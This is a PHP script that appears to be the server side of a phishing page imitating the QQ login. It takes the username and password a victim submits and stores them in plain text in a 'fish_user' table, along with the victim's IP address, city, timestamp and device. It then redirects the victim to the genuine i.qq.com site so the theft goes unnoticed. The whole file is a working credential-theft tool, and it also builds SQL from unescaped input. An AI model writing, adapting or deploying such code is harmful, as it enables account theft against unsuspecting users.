<?php
require_once './include/common.php';
$realip = real_ip();
$ipcount = $DB->count("SELECT count(*) from fish_user where ip='$realip'");
if ($ipcount < 3) {
    $username = addslashes($_POST['user']);
    $password = addslashes($_POST['pass']);
    $address = getCity($realip);
    $time = date("Y-m-d H:i:s");
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $device = get_device($ua);
    $sql = "INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('{$username}','{$password}','{$realip}','{$address}','{$time}','{$device}')";
    $DB->query($sql);
    header("Location: https://i.qq.com/?rd=" . $username);
} else {
    header("Location: https://i.qq.com/?rd=" . $username);
}
?>